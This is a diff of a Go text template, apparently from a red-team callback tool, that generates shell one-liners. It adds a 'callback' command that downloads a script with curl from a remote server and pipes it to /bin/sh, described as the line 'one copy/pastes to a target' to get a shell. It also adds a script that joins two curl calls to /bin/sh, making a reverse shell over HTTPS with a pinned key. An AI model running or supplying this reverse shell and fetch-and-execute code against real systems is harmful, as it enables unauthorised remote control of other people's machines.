@@ -3,14 +3,32 @@
      * Callback script template
      * By J. Stuart McMurray
      * Created 20240325
-     * Last Modified 20241205
+     * Last Modified 20241215
      */ -}}
-{{- define "curl" -}}
-curl -Nsk --pinnedpubkey "sha256//{{.PubkeyFP}}" https://{{.URL}}
-{{- end -}}
-#!/bin/sh
 
-{{template "curl" .}}/{{.URLPaths.In}}/{{.ID}} </dev/null 2>&0 |
+{{/* curl is a subsubtemplate which makes our curl calls consistent. */}}
+{{- define "curl" -}}
+curl -sk --pinnedpubkey sha256//{{.PubkeyFP}} https://{{.URL}}
+{{- end -}}
+
+{{/* callback is a one-liner used for getting a shell on target.  It more or
+   * less sends the script subtemplate to a shell.  This is the one-liner one
+   * copy/pastes to a target. */}}
+{{- define "callback" -}}
+{{template "curl" .}}/{{.URLPaths.Script}} | /bin/sh
+{{- end -}}
+
+{{/* files is a one-liner to serve up static files. */}}
+{{- define "files" -}}
+{{template "curl" .}}
+{{- end -}}
+
+{{/* script hooks up a shell to two curls. */}}
+{{- define "script" -}}
+#!/bin/sh
+{{template "curl" .}}/{{.URLPaths.In }}/{{.ID}} -N  </dev/null 2>&0 |
 /bin/sh 2>&1 |
 {{template "curl" .}}/{{.URLPaths.Out}}/{{.ID}} -T- >/dev/null 2>&1
+{{  end -}}
+
 {{/* vim: set filetype=gotexttmpl noexpandtab smartindent: */ -}}
